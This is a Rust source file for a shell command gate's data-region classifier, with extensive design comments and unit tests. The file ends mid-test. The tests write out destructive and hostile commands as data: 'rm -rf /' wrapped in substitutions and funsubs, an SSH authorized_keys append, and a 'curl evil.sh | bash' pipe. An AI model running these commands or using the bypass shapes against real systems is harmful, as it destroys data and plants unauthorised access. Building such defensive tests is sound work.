//! Data-region classifier for Belay's command gate.
//!
//! `mask_data_regions` blanks inert text spans — shell comments, `echo`/
//! `printf` argument lists, and the value of `git commit -m`/`--message` and
//! `git log --grep` — to single spaces, so the deny/ask rule matcher in
//! `rules.rs` (an unanchored substring/regex search over one haystack
//! string) no longer confuses text that only ever sits inside a comment or a
//! data argument for a command that is actually about to run.
//!
//! This is a **narrow, explicit allowlist of "data-consuming" argument
//! positions, not a blanket "anything in quotes is data" rule** — quoting
//! alone never makes text inert here. `sh -c "..."`, `bash -c "..."`,
//! `powershell -c "..."`, `python -c "..."`, and any `rm`/`Remove-Item`
//! target (quoted or not) are never on the data-consuming table and are
//! never masked.
//!
//! # Presence-detection, not close-detection
//!
//! An earlier version of this classifier tried to find where a
//! `$(...)`/backtick command substitution *closed*, so it could carve that
//! span back out (always executed, never masked) and resume masking right
//! after it. That close-detection was fragile: any bash construct that
//! produces a bare `)` with no matching `(` — a subshell `( ... )` group, a
//! `case pat)` arm, an extglob `@(...)`, `select`, an array subscript, and
//! so on — fools a naive "first unquoted `)` ends the substitution" scan
//! into ending the substitution early, so a payload sitting right after that
//! bare `)` (but still genuinely inside the substitution, per a real shell)
//! gets wrongly reprocessed as ordinary data and masked away — hidden. That
//! false-negative class is open-ended: any new bare-`)`-producing construct
//! reopens it.
//!
//! This classifier does not try that anymore. It never looks for where a
//! substitution closes — only whether one is *present*. The rule:
//!
//! - **Comments** (`#` at an unquoted token-start position, to end of the
//!   physical line) are **always masked** — the shell never executes a
//!   comment, regardless of what's in it, so masking one can never hide
//!   executed code.
//! - A **data-consuming argument** (`echo`/`printf`'s argument list; `git
//!   commit -m`/`--message`'s value; `git log --grep`'s value) has its
//!   *content* masked **only if it contains none of `$`, a backtick, or a
//!   `(` — outside any single-quoted span**. This is an allowlist ("only
//!   mask metacharacter-free content"), not an enumeration of known-bad
//!   forms: every bash construct that can execute a command from within an
//!   argument requires at least one of these three characters (command
//!   substitution needs `$(` or a backtick; the `${ ...; }` funsub needs
//!   `$`; process substitution, a subshell, arithmetic commands, and
//!   extglobs all need `(`), so an argument containing none of them,
//!   outside single quotes, cannot execute a command and is safe to mask.
//!   The moment any of the three is found (scanning left to right, outside
//!   single quotes), content masking is abandoned for that whole
//!   data-consuming argument: none of its textual content is masked, not
//!   even the text scanned before the disqualifying character, so nothing in
//!   it can ever be hidden while genuinely executable text might be sitting
//!   anywhere in the same argument. Fail safe. The argument's bare
//!   structural punctuation — a real quote delimiter, `$(`, a backtick, or
//!   any unescaped `(`/`)` outside single quotes — is still masked
//!   character-by-character as it's encountered, disqualified or not: it
//!   carries no content of its own to hide, and masking it keeps a
//!   disqualified argument's own delimiter noise (e.g. the unmasked closing
//!   `)` of a `$(...)`) from landing directly adjacent to a carved-out
//!   dangerous target and silently breaking a downstream rule's own
//!   adjacency requirement. A bare `$` not followed by `(` (e.g. a funsub's
//!   `${` or a plain `$var`) disqualifies the argument the same way but is
//!   not itself "structural" punctuation in this sense — it carries no
//!   delimiter-adjacency risk, so unlike `$(`/backtick/`(`/`)` it is left
//!   visible, same as the rest of a disqualified argument's content.
//!
//! **Single-quote exemption**: inside a single-quoted span (`'...'`), the
//! shell performs no expansion or execution at all — `$(...)`, backticks,
//! and `(` are all inert, literal characters there. So an execution-capable
//! character inside a single-quoted span does *not* disqualify, and (unlike
//! outside single quotes) is never treated as punctuation to mask on its
//! own — it is ordinary literal content, masked only if the *rest* of the
//! argument never disqualifies it. Single quotes have no escaping (a `\` is
//! literal inside them; the span ends only at the next `'`).
//!
//! Because a masked span is now only ever a comment (never executed), bare
//! structural punctuation (never content), or a data-consuming argument with
//! zero execution-capable constructs outside single quotes (so nothing in it
//! can execute), masking can never hide executed *content* — the
//! false-negative class this replaces is eliminated by construction, not by
//! chasing down each new bare-`)` shape one at a time.
//!
//! **The cost, deliberately accepted**: a data-consuming argument that
//! contains *both* a substitution *and* separately dangerous literal text
//! (e.g. `echo "$(date) rm -rf /"`, where `rm -rf /` is only ever echoed,
//! never run) is now left fully visible and will be denied — a false
//! positive. This is the safe direction (fail toward blocking, not toward
//! hiding), and it is rare. It is never worth trading back for close-parsing.
//! Disqualifying on any bare `$` (not just `$(`) widens this same accepted
//! false-positive slightly and deliberately: a data arg containing an
//! innocuous `$var` alongside separately dangerous literal text (e.g. `echo
//! "$USER: rm -rf /"`) is now also left visible and denied, in exchange for
//! closing the `${ ...; }` funsub gap (a bare `$` with no following `(` is
//! how a funsub starts). Not traded back.
//!
//! **Fail-safe**: unbalanced quotes or input over [`MAX_LEN`] bytes return
//! the input **unmodified** — equivalent to every byte being classified
//! executed. Both failure modes fail toward more matching, never less.
//! (There is no recursion left in this scanner, so there is no nesting depth
//! to cap — every scan is a single linear pass.)
//!
//! Masked bytes become single spaces, never deleted, so masked spans
//! collapse away cleanly in `norm_cmd`'s existing whitespace-collapse step
//! exactly like real whitespace, and two adjacent executed fragments can
//! never splice into an accidental new match.
//!
//! See `docs/superpowers/specs/2026-07-17-command-gate-exec-context-classifier-design.md`
//! ("The region model") for the design this module originally implemented,
//! and the FIX-2 rework brief for why the substitution-close machinery
//! described there was removed.

/// Input length cap (bytes). Oversized input aborts masking (fail-safe).
const MAX_LEN: usize = 65_536;

/// What a data-region scan is looking for to end its own segment.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Terminator {
    /// Scanning a data-consuming command's argument list (`echo`/`printf`)
    /// or a `git commit -m`/`--message`/`git log --grep` value: stop
    /// *without consuming* at the next unquoted top-level separator (`;`,
    /// `&&`, `||`, `|`, `&`, newline) or redirection (`>`, `<`), or end of
    /// input.
    TopLevelSep,
    /// Scanning a single unquoted flag value: stop *without consuming* at
    /// the next unquoted whitespace, top-level separator/redirection, or
    /// end of input.
    Whitespace,
}

/// Masks inert data regions in `s`, returning a new string of the same
/// length (masked bytes become single spaces) — or `s` unmodified if the
/// scanner cannot safely classify it (see module docs, "Fail-safe").
pub(crate) fn mask_data_regions(s: &str) -> String {
    if s.len() > MAX_LEN {
        return s.to_string();
    }
    let chars: Vec<char> = s.chars().collect();
    let mut out = chars.clone();
    let ok = {
        let mut scanner = Scanner { chars: &chars, out: &mut out };
        scanner.process(0).is_some()
    };
    if ok {
        out.into_iter().collect()
    } else {
        s.to_string()
    }
}

struct Scanner<'a> {
    chars: &'a [char],
    out: &'a mut [char],
}

impl Scanner<'_> {
    /// Top-level scan over the whole command string: tracks quote state,
    /// recognizes comments (always masked) and top-level separators (which
    /// reset command-word recognition), and — at the start of a fresh
    /// command word — recognizes the data-consuming-command table
    /// (`echo`/`printf`/`git commit`/`git log`), delegating their
    /// argument/value spans to [`Scanner::scan_data_region`]. Every other
    /// character is left untouched (`out` starts as a clone of `chars`, so
    /// "untouched" means "visible/executed").
    ///
    /// Returns the index past the end of input on success, or `None` on an
    /// unbalanced quote (fail-safe).
    fn process(&mut self, mut i: usize) -> Option<usize> {
        let mut quote: Option<char> = None;
        let mut cmd_start = true;

        while i < self.chars.len() {
            let c = self.chars[i];

            // Quote open. Skipped if the quote character is itself
            // backslash-escaped (an odd number of `\` immediately before
            // it) — `\"`/`\'` in unquoted context is a literal character,
            // not a real quote delimiter.
            if quote.is_none() && (c == '\'' || c == '"') && !is_escaped(self.chars, i) {
                quote = Some(c);
                i += 1;
                cmd_start = false;
                continue;
            }
            // Inside a quote: only the matching, non-escaped delimiter ends
            // it (single quotes have no escaping at all — the `q == '\''`
            // check skips the escape test there). Nothing inside a quote is
            // ever masked or specially recognized at this top level (only a
            // recognized data-consuming argument's own scan masks
            // anything).
            if let Some(q) = quote {
                if c == q && (q == '\'' || !is_escaped(self.chars, i)) {
                    quote = None;
                }
                i += 1;
                continue;
            }

            // Shell comment: unquoted `#` at a token-start position, to end
            // of the physical line. Always masked.
            if c == '#' && is_comment_start(self.chars, i) {
                let mut j = i;
                while j < self.chars.len() && self.chars[j] != '\n' {
                    self.out[j] = ' ';
                    j += 1;
                }
                i = j;
                cmd_start = true;
                continue;
            }

            // Top-level separators reset command-word recognition.
            if let Some(len) = top_level_sep_len(self.chars, i) {
                i += len;
                cmd_start = true;
                continue;
            }
            if c.is_whitespace() {
                i += 1;
                continue;
            }

            // Data-consuming-command recognition, only at a fresh
            // command-start position.
            if cmd_start {
                if let Some(word_end) = word_end_at(self.chars, i) {
                    let word: String = self.chars[i..word_end].iter().collect();
                    match word.as_str() {
                        "echo" | "printf" => {
                            i = self.scan_data_region(word_end, Terminator::TopLevelSep)?;
                            cmd_start = false;
                            continue;
                        }
                        "git" => {
                            if let Some((sub, sub_end)) = next_word(self.chars, word_end) {
                                if sub == "commit" {
                                    i = self.scan_git_value_flags(sub_end, &["-m", "--message"])?;
                                    cmd_start = false;
                                    continue;
                                } else if sub == "log" {
                                    i = self.scan_git_value_flags(sub_end, &["--grep"])?;
                                    cmd_start = false;
                                    continue;
                                }
                            }
                            i = word_end;
                            cmd_start = false;
                            continue;
                        }
                        _ => {
                            i = word_end;
                            cmd_start = false;
                            continue;
                        }
                    }
                }
            }

            // Ordinary character — left visible/executed.
            i += 1;
            cmd_start = false;
        }

        if quote.is_some() {
            return None; // unbalanced quote -> fail-safe
        }
        Some(i)
    }

    /// Scans a data-consuming argument/value span starting at `start`,
    /// through `terminator`'s boundary. Tracks quote state the same way
    /// `process` does. Two independent things happen along the way:
    ///
    /// - A comment (`#` at an unquoted token-start position) is always
    ///   masked immediately, to end of line, regardless of anything else —
    ///   a comment truncates the argument's real content right there (the
    ///   shell never even parses past it as this command's data), so
    ///   nothing after this point is scanned as argument content; the scan
    ///   ends at the comment.
    /// - Otherwise, the scan watches for `$`, a backtick, or `(` — outside
    ///   any single-quoted span. The instant one is seen (outside single
    ///   quotes), this whole argument is disqualified from *content*
    ///   masking — presence only, no attempt is ever made to find where any
    ///   construct built from it closes. This is an allowlist ("only mask
    ///   content with none of these three characters"), not an enumeration
    ///   of specific execution-capable constructs: every construct that can
    ///   execute a command from within an argument needs at least one of
    ///   them (see the module doc), so the check is complete by
    ///   construction rather than by cataloguing shapes like `${ ...; }`
    ///   one at a time.
    ///
    /// If the argument is never disqualified, `[start, end)` is masked to
    /// spaces in bulk once the boundary is known (never partially, never
    /// eagerly — so a disqualifying construct found *after* some already-
    /// scanned safe-looking text can never leave that earlier text masked).
    ///
    /// If it *is* disqualified, its textual content is left fully visible —
    /// but the bare structural punctuation (a real quote delimiter, `$(`, a
    /// backtick, or any unescaped `(`/`)`, outside single quotes) is still
    /// masked, character by character, as it's seen — never "found and
    /// paired off", just blanked on sight. This carries no content of its
    /// own to hide, and masking it keeps a disqualified argument's own
    /// wrapping/delimiter noise from landing directly adjacent to a
    /// carved-out dangerous target and breaking a downstream rule's own
    /// adjacency requirement (`destructive.rm_rf`'s `(\s|$)` right after the
    /// target, the same shape `echo "$(rm -rf /)"` needs: without this, the
    /// substitution's own unmasked closing `)` would sit immediately after
    /// `/`, no whitespace, and the rule would never fire).
    ///
    /// Returns `None` on an unbalanced quote (fail-safe).
    fn scan_data_region(&mut self, start: usize, terminator: Terminator) -> Option<usize> {
        let mut i = start;
        let mut quote: Option<char> = None;
        let mut disqualified = false;

        while i < self.chars.len() {
            let c = self.chars[i];

            if quote.is_none() {
                match terminator {
                    Terminator::TopLevelSep | Terminator::Whitespace
                        if is_data_arg_boundary(self.chars, i) =>
                    {
                        break;
                    }
                    Terminator::Whitespace if c.is_whitespace() => break,
                    _ => {}
                }
            }

            if quote.is_none() && (c == '\'' || c == '"') && !is_escaped(self.chars, i) {
                quote = Some(c);
                self.out[i] = ' '; // structural punctuation: always masked
                i += 1;
                continue;
            }
            if let Some(q) = quote {
                if c == q && (q == '\'' || !is_escaped(self.chars, i)) {
                    quote = None;
                    self.out[i] = ' '; // structural punctuation: always masked
                    i += 1;
                    continue;
                }
                if q == '\'' {
                    // Single-quoted: the shell performs no expansion at all
                    // here — no comment/disqualification recognition, and no
                    // eager punctuation masking either (nothing here is
                    // "structural" to the shell, it's all literal content) —
                    // masked only by the bulk pass below if this argument
                    // turns out not disqualified.
                    i += 1;
                    continue;
                }
                // Double-quoted: falls through — comments aren't recognized
                // inside any quote (gated by `quote.is_none()` below), but
                // the disqualification check still applies (the shell still
                // expands `$(...)`/backticks inside double quotes).
            }

            // Shell comment — always masked immediately, independent of
            // this argument's disqualification verdict. Ends the argument's
            // real content: everything scanned in `[start, i)` is subject
            // to the normal disqualification-based bulk mask below: mask it
            // as this comment terminates the argument.
            if quote.is_none() && c == '#' && is_comment_start(self.chars, i) {
                let mut j = i;
                while j < self.chars.len() && self.chars[j] != '\n' {
                    self.out[j] = ' ';
                    j += 1;
                }
                if !disqualified {
                    for k in start..i {
                        self.out[k] = ' ';
                    }
                }
                return Some(j);
            }

            // Disqualifying character, outside single quotes: presence only
            // disqualifies masking of *content* for the rest of this
            // argument — no attempt is made to find where any construct
            // built from it closes. `$` disqualifies on its own (not just
            // `$(`) — it also covers the `${ ...; }` funsub, `$(( ))`,
            // `$[ ]`, and `$'...'`, and conservatively a bare `$var` too (see
            // module doc). Structural delimiter punctuation — the `$(` pair,
            // a lone backtick, or a bare `(`/`)` — is masked unconditionally
            // either way, same as before; see the doc comment above for why.
            // A bare `$` not followed by `(` disqualifies but is not itself
            // treated as delimiter punctuation, so it is left visible like
            // the rest of a disqualified argument's content.
            if quote != Some('\'') {
                if c == '$' && !is_escaped(self.chars, i) {
                    disqualified = true;
                    if self.chars.get(i + 1) == Some(&'(') {
                        self.out[i] = ' ';
                        self.out[i + 1] = ' ';
                        i += 2;
                    } else {
                        i += 1;
                    }
                    continue;
                }
                if c == '`' && !is_escaped(self.chars, i) {
                    disqualified = true;
                    self.out[i] = ' ';
                    i += 1;
                    continue;
                }
                if c == '(' && !is_escaped(self.chars, i) {
                    disqualified = true;
                    self.out[i] = ' ';
                    i += 1;
                    continue;
                }
                if c == ')' && !is_escaped(self.chars, i) {
                    // Not itself disqualifying (a bare `)` alone opens
                    // nothing), but still bare structural punctuation —
                    // always masked, same as its `(` counterpart.
                    self.out[i] = ' ';
                    i += 1;
                    continue;
                }
            }

            i += 1;
        }

        if quote.is_some() {
            return None; // unbalanced quote -> fail-safe
        }
        if !disqualified {
            for k in start..i {
                self.out[k] = ' ';
            }
        }
        Some(i)
    }

    /// Scans a `git commit`/`git log` invocation from `start` (right after
    /// the `commit`/`log` word) to the next top-level separator, masking
    /// only the *value* of any recognized flag in `flag_names` (also
    /// matches the `--flag=value` inline form) via
    /// [`Scanner::scan_data_region`]. Everything else in the invocation —
    /// the flag token itself, every other argument, the `git commit`/`git
    /// log` prefix — stays executed/visible.
    fn scan_git_value_flags(&mut self, start: usize, flag_names: &[&str]) -> Option<usize> {
        let mut i = start;
        let mut quote: Option<char> = None;
        while i < self.chars.len() {
            let c = self.chars[i];
            if quote.is_none() && top_level_sep_len(self.chars, i).is_some() {
                break;
            }
            if quote.is_none() && (c == '\'' || c == '"') && !is_escaped(self.chars, i) {
                quote = Some(c);
                i += 1;
                continue;
            }
            if let Some(q) = quote {
                // See `process`'s own quote-close handling: escape-awareness
                // applies inside double quotes, never inside single quotes.
                if c == q && (q == '\'' || !is_escaped(self.chars, i)) {
                    quote = None;
                }
                i += 1;
                continue;
            }
            if c == '#' && is_comment_start(self.chars, i) {
                let mut j = i;
                while j < self.chars.len() && self.chars[j] != '\n' {
                    self.out[j] = ' ';
                    j += 1;
                }
                i = j;
                continue;
            }
            // Flag recognition at a token-start position.
            if (i == start || self.chars[i - 1].is_whitespace()) && !c.is_whitespace() {
                if let Some(word_end) = word_end_at(self.chars, i) {
                    let word: String = self.chars[i..word_end].iter().collect();
                    let mut matched = false;
                    for &flag in flag_names {
                        if word == flag {
                            let mut vs = word_end;
                            while vs < self.chars.len() && self.chars[vs].is_whitespace() {
                                vs += 1;
                            }
                            i = self.scan_data_region(vs, Terminator::Whitespace)?;
                            matched = true;
                            break;
                        }
                        let prefix = format!("{flag}=");
                        if word.starts_with(&prefix) {
                            let vs = i + prefix.chars().count();
                            i = self.scan_data_region(vs, Terminator::Whitespace)?;
                            matched = true;
                            break;
                        }
                    }
                    if !matched {
                        i = word_end;
                    }
                    continue;
                }
            }
            i += 1;
        }
        Some(i)
    }
}

/// True if `chars[i]` is backslash-escaped: preceded by an odd number of
/// consecutive `\` characters. An escaped quote/paren/backtick is a literal
/// character to the shell, not a structural delimiter — this is what lets
/// `\"`/`\'`/`\(`/`` \` `` in unquoted or double-quoted context pass through
/// as ordinary data instead of (wrongly) toggling quote state or being
/// mistaken for a real execution-capable construct. Two consecutive `\` are
/// an escaped `\` (even count, not escaped); three are an escaped `\` plus
/// an escaped delimiter (odd count, escaped); and so on.
fn is_escaped(chars: &[char], i: usize) -> bool {
    chars[..i].iter().rev().take_while(|&&c| c == '\\').count() % 2 == 1
}

/// If `chars[i]` begins a top-level command separator (`;`, `&`, `|`,
/// including the two-char forms `&&`/`||`, or a newline), the separator's
/// length in chars.
fn top_level_sep_len(chars: &[char], i: usize) -> Option<usize> {
    match chars[i] {
        '&' if chars.get(i + 1) == Some(&'&') => Some(2),
        '|' if chars.get(i + 1) == Some(&'|') => Some(2),
        ';' | '&' | '|' | '\n' => Some(1),
        _ => None,
    }
}

/// True if `chars[i]` ends a data-consuming command's argument list (or a
/// bare flag value): every [`top_level_sep_len`] separator, plus a
/// redirection operator (`>`, `>>`, `<`, `<<`). Redirection is not itself a
/// *command* separator (no new command starts after `cmd > file`, so
/// `top_level_sep_len` deliberately excludes it), but its target is a write
/// destination, not printed data — `echo k >> ~/.ssh/authorized_keys` must
/// not have `authorized_keys` masked away as if it were part of what echo
/// prints.
fn is_data_arg_boundary(chars: &[char], i: usize) -> bool {
    top_level_sep_len(chars, i).is_some() || matches!(chars[i], '>' | '<')
}

/// `#` at `i` starts a shell comment only when it opens a new token in an
/// unquoted position — preceded by start-of-string, whitespace, or a shell
/// metacharacter. A `#` inside a quoted string, or as part of a longer word
/// (`http://x#frag`, `$#`), is not a comment start. (Callers already gate
/// this on `quote.is_none()`; this only checks the *preceding character*.)
fn is_comment_start(chars: &[char], i: usize) -> bool {
    if i == 0 {
        return true;
    }
    let prev = chars[i - 1];
    prev.is_whitespace() || matches!(prev, ';' | '&' | '|' | '(' | ')' | '`')
}

/// True if `chars[i]` is a boundary a "word" (command name / flag token)
/// cannot cross: whitespace, a quote, a comment start, a top-level
/// separator, or the start of a `$(...)`/backtick substitution.
fn is_word_boundary(chars: &[char], i: usize) -> bool {
    let c = chars[i];
    if c.is_whitespace() || c == '\'' || c == '"' || c == '#' {
        return true;
    }
    if top_level_sep_len(chars, i).is_some() {
        return true;
    }
    if c == '$' && chars.get(i + 1) == Some(&'(') {
        return true;
    }
    c == '`'
}

/// The index just past the maximal run of non-boundary characters starting
/// at `i`, or `None` if `chars[i]` is itself a boundary (empty word).
fn word_end_at(chars: &[char], i: usize) -> Option<usize> {
    if i >= chars.len() || is_word_boundary(chars, i) {
        return None;
    }
    let mut j = i;
    while j < chars.len() && !is_word_boundary(chars, j) {
        j += 1;
    }
    Some(j)
}

/// Skips whitespace from `from`, then returns the next word and its end
/// index, if any.
fn next_word(chars: &[char], from: usize) -> Option<(String, usize)> {
    let mut i = from;
    while i < chars.len() && chars[i].is_whitespace() {
        i += 1;
    }
    let end = word_end_at(chars, i)?;
    Some((chars[i..end].iter().collect(), end))
}

#[cfg(test)]
mod tests {
    use super::mask_data_regions;

    /// Everything after `haystack_has` should still be findable as a
    /// contiguous substring in the masked output (executed / visible).
    fn visible(cmd: &str, needle: &str) {
        let masked = mask_data_regions(cmd);
        assert!(
            masked.contains(needle),
            "expected {needle:?} visible in masked output of {cmd:?}, got {masked:?}"
        );
    }

    /// `needle` must NOT appear as a contiguous substring in the masked
    /// output (it was masked to spaces).
    fn inert(cmd: &str, needle: &str) {
        let masked = mask_data_regions(cmd);
        assert!(
            !masked.contains(needle),
            "expected {needle:?} masked out of {cmd:?}, got {masked:?}"
        );
    }

    // ---- comment masking + boundary -----------------------------------

    #[test]
    fn comment_from_start_of_string_is_masked() {
        inert("# rm -rf / is dangerous, do not run", "rm -rf /");
    }

    #[test]
    fn comment_after_command_is_masked_to_end_of_line() {
        let masked = mask_data_regions("true # rm -rf / trailing\nrm -rf /");
        assert!(!masked.contains("true # rm -rf / trailing"));
        // The comment's scope stops at the newline — the *next* physical
        // line's command must remain fully visible (a comment must never
        // swallow a genuinely dangerous command on the next line).
        assert!(masked.contains("rm -rf /"));
    }

    #[test]
    fn hash_inside_double_quotes_is_not_a_comment() {
        // `#` inside real quotes is literal to the shell, not a comment —
        // and here it sits outside any data-consuming command, so the
        // whole quoted span (including the `#`) must stay visible/executed.
        visible("sh -c \"echo hi #123 rm -rf /\"", "rm -rf /");
    }

    #[test]
    fn hash_mid_word_is_not_a_comment() {
        // `http://x#frag` — `#` is not preceded by whitespace/start/a shell
        // metacharacter, so it is not a comment start.
        visible("curl http://x#frag/rm -rf /", "rm -rf /");
    }

    #[test]
    fn hash_after_semicolon_is_a_comment_start() {
        inert("true ; # rm -rf / danger", "rm -rf /");
    }

    // ---- echo / printf / git commit -m / git log --grep value masking --

    #[test]
    fn echo_double_quoted_argument_is_masked() {
        inert("echo \"rm -rf / now\"", "rm -rf /");
    }

    #[test]
    fn echo_single_quoted_argument_is_masked() {
        inert("echo 'rm -rf / now'", "rm -rf /");
    }

    #[test]
    fn echo_unquoted_argument_is_masked() {
        inert("echo rm -rf / now", "rm -rf /");
    }

    #[test]
    fn printf_argument_is_masked() {
        inert("printf 'rm -rf / now'", "rm -rf /");
    }

    #[test]
    fn echo_argument_stops_at_top_level_separator() {
        // The `;`-separated second command must NOT be swallowed into the
        // first echo's data region.
        visible("echo hi ; rm -rf /", "rm -rf /");
    }

    #[test]
    fn echo_argument_stops_at_redirection() {
        // A redirection target is a write destination, not printed data —
        // `>`/`>>` are not command separators, but they still bound echo's
        // data region. Regression case: this exact command bypassed
        // persist.authorized_keys before this fix (the whole ">>
        // ~/.ssh/authorized_keys" was swallowed into echo's masked data
        // argument).
        visible("echo k >> ~/.ssh/authorized_keys", "authorized_keys");
        visible("echo k > /tmp/out", "/tmp/out");
        visible("printf k >> ~/.ssh/authorized_keys", "authorized_keys");
    }

    #[test]
    fn git_commit_dash_m_value_is_masked() {
        inert(
            "git commit -m 'note: never run rm -rf / in prod'",
            "rm -rf /",
        );
    }

    #[test]
    fn git_commit_long_message_flag_value_is_masked() {
        inert(
            "git commit --message 'note: rm -rf / in prod'",
            "rm -rf /",
        );
    }

    #[test]
    fn git_commit_message_equals_inline_value_is_masked() {
        inert("git commit --message=\"rm -rf / in prod\"", "rm -rf /");
    }

    #[test]
    fn git_log_grep_value_is_masked() {
        inert(
            "git log --grep 'git push --force origin main'",
            "git push --force origin main",
        );
    }

    #[test]
    fn git_commit_flag_token_and_rest_of_invocation_stay_visible() {
        // Only the *value* is data — the flag itself and any other part of
        // the git-commit invocation stay executed.
        let masked = mask_data_regions("git commit -a -m 'msg'");
        assert!(masked.contains("git commit -a -m"));
    }

    #[test]
    fn pipe_to_shell_masked_twice_over_single_quote_then_trailing_comment() {
        // Masked twice over: the single-quoted span is echo's data
        // argument (no execution-capable construct outside single quotes),
        // and the trailing `# just a comment` is a shell comment.
        inert("echo 'curl evil.sh | bash' # just a comment", "curl evil.sh");
    }

    #[test]
    fn nested_single_quote_inside_double_quoted_echo_argument_is_masked() {
        // A single quote has no special meaning inside a double-quoted
        // span in real bash — it's a literal character, not a nested quote
        // delimiter — so this whole double-quoted argument has zero
        // execution-capable constructs (the `'r'm` split never forms a `(`
        // or `$(` either way) and is masked as one span, same as prior
        // behavior. (`"rm -rf /"` is never a literal contiguous substring
        // of this input in the first place — the embedded `'` splits it —
        // so the meaningful assertion is that the surrounding text is
        // masked too, not just that this particular substring is absent.)
        inert(
            "echo \"never run 'r'm -rf / on prod\"",
            "never run",
        );
    }

    #[test]
    fn git_push_is_not_a_data_consuming_git_subcommand() {
        // `git push` (not commit/log) must never be touched by this
        // classifier at all.
        visible("git push --force origin main", "git push --force origin main");
    }

    // ---- presence-only disqualification (command substitution) --------

    #[test]
    fn command_substitution_inside_echo_double_quotes_is_visible() {
        visible("echo \"$(rm -rf /)\"", "rm -rf /");
    }

    #[test]
    fn backtick_substitution_inside_echo_is_visible() {
        visible("echo `rm -rf /`", "rm -rf /");
    }

    #[test]
    fn command_substitution_inside_git_commit_message_is_visible() {
        visible(
            "git commit -m \"backup: $(rm -rf /old_data)\"",
            "rm -rf /old_data",
        );
    }

    #[test]
    fn single_quoted_dollar_paren_inside_data_region_stays_inert() {
        // Single quotes suppress the shell's own substitution — the
        // single-quote exemption means `$(` here does not disqualify.
        inert("echo 'literal $(rm -rf /) text'", "rm -rf /");
    }

    #[test]
    fn nested_substitution_two_levels_deep_is_visible() {
        visible("echo \"$(echo \"$(rm -rf /)\")\"", "rm -rf /");
    }

    #[test]
    fn disqualified_argument_with_separately_dangerous_literal_text_is_visible() {
        // The accepted, deliberate safe false-positive this design trades
        // for eliminating the close-parsing false-negative class: `$(date)`
        // disqualifies the whole argument from masking, so the separately
        // dangerous (merely echoed, never executed) literal text sitting
        // next to it is left visible too, and this now denies. Never traded
        // back for close-parsing.
        visible("echo \"$(date) rm -rf /\"", "rm -rf /");
    }

    // ---- FIX-3: bare `$` disqualifies too (bash 5.3 `${ ...; }` funsub) --
    //
    // FIX-2 enumerated only `$(`, backtick, and bare `(` as disqualifying.
    // bash 5.3's `${ command; }` funsub contains none of them — it opens
    // with `${`, not `$(` — so under FIX-2 an argument containing only a
    // funsub (no other disqualifying character) was wrongly bulk-masked,
    // hiding the payload. FIX-3 broadens the disqualifying set to ANY `$`
    // (not just `$(`), which is provably complete: every command-execution-
    // from-argument form needs `$`, a backtick, or `(` (see module doc).

    #[test]
    fn funsub_inside_echo_double_quotes_is_visible() {
        // The exact case that motivated FIX-3.
        visible("echo \"${ rm -rf / ; }\"", "rm -rf /");
    }

    #[test]
    fn funsub_inside_printf_is_visible() {
        visible("printf \"%s\" \"${ rm -rf / ; }\"", "rm -rf /");
    }

    #[test]
    fn funsub_inside_git_commit_message_is_visible() {
        visible(
            "git commit -m \"backup: ${ rm -rf / ; }\"",
            "rm -rf /",
        );
    }

    #[test]
    fn funsub_inside_git_log_grep_is_visible() {
        visible("git log --grep \"${ rm -rf / ; }\"", "rm -rf /");
    }

    #[test]
    fn single_quoted_funsub_stays_inert() {
        // Single-quote exemption is unchanged: inside `'...'` the shell
        // performs no expansion at all, so a bare `$` there does not
        // disqualify either.
        inert("echo 'literal ${ rm -rf / ; } text'", "rm -rf /");
    }

    #[test]
    fn bare_dollar_var_widens_the_accepted_false_positive() {
        // The deliberately accepted, safe widening: a bare `$var` (not
        // `$(`) now also disqualifies the whole argument from masking, so
        // separately dangerous literal text sitting next to an innocuous
        // variable reference is left visible too, and this now denies.
        // Never traded back.
        visible("echo \"$USER: rm -rf /\"", "rm -rf /");
    }

    // ---- bare `)` constructs that defeated the old close-parsing scanner
    //
    // A real shell balances any bare `(...)` subshell group, `case pat)`
    // arm, or extglob nested inside a `$(...)`/backtick substitution before
    // the substitution itself closes. The old scanner took the FIRST
    // unquoted `)` as the substitution's end, so any of these constructs'
    // own bare `)` wrongly ended the outer `$(...)` early — everything
    // after it (including a payload right there in the same substitution)
    // was reprocessed as ordinary masked data instead of staying visible.
    // This classifier no longer looks for where a substitution closes at
    // all — it only detects that one is present — so none of these
    // constructs can fool it, by construction, not by enumeration.

    #[test]
    fn bare_paren_subshell_inside_echo_dollar_paren_stays_visible() {
        visible("echo \"$( (true); rm -rf / )\"", "rm -rf /");
    }

    #[test]
    fn bare_paren_subshell_inside_printf_dollar_paren_stays_visible() {
        visible("printf \"%s\" \"$( (true); rm -rf / )\"", "rm -rf /");
    }

    #[test]
    fn bare_paren_subshell_inside_git_commit_message_stays_visible() {
        visible(
            "git commit -m \"backup: $( (true); rm -rf / )\"",
            "rm -rf /",
        );
    }

    #[test]
    fn bare_paren_subshell_inside_git_log_grep_stays_visible() {
        visible("git log --grep \"$( (true); rm -rf / )\"", "rm -rf /");
    }

    #[test]
    fn case_pattern_bare_paren_inside_dollar_paren_stays_visible() {
        // The case that motivated this rework: `case x)`'s bare `)` has no
        // matching `(` at all — the old bare-paren-depth counter (added to
        // handle the subshell-group case above) still mistook this `)` for
        // the substitution's own close, since there was never a `(` to pair
        // it with.
        visible(
            "echo \"$( case x in x) rm -rf / ;; esac )\"",
            "rm -rf /",
        );
    }

    #[test]
    fn extglob_bare_paren_alone_disqualifies_with_no_dollar_paren_at_all() {
        // A bare `(` disqualifies on its own — no `$(`/backtick needed.
        // Here the only execution-capable character in the argument is the
        // extglob's own `(`; not a named reproduction in the brief, but
        // exactly the open-ended shape the presence-only rule eliminates as
        // a class rather than patching one bare-`)` producer at a time.
        visible("echo \"@(rm -rf /)\"", "rm -rf /");
    }

    // ---- backslash-escape awareness on quote toggles (regression) -------
    //
    // The scanner used to toggle quote state on any `'`/`"` with no check
    // for a preceding unescaped backslash, so an escaped quote outside a
    // real quote (`\"`) was misread as OPENING a quote — absorbing a later
    // real separator (here, `;`) and the executed command that follows it
    // into "inert" scope. `rm -rf /` here is a real, separate, executed
    // command that must stay visible/executed.

    #[test]
    fn escaped_quote_in_echo_argument_does_not_swallow_next_command() {
        visible("echo hi \\\" ; rm -rf / \\\"", "rm -rf /");
    }

    // ---- fail-safe --------------------------------------------------------

    #[test]
    fn unbalanced_double_quote_is_unchanged() {
        let cmd = "echo \"rm -rf / unterminated";
        assert_eq!(mask_data_regions(cmd), cmd);
    }

    #[test]
    fn unbalanced_single_quote_is_unchanged() {
        let cmd = "echo 'rm -rf / unterminated";
        assert_eq!(mask_data_regions(cmd), cmd);
    }

    #[test]
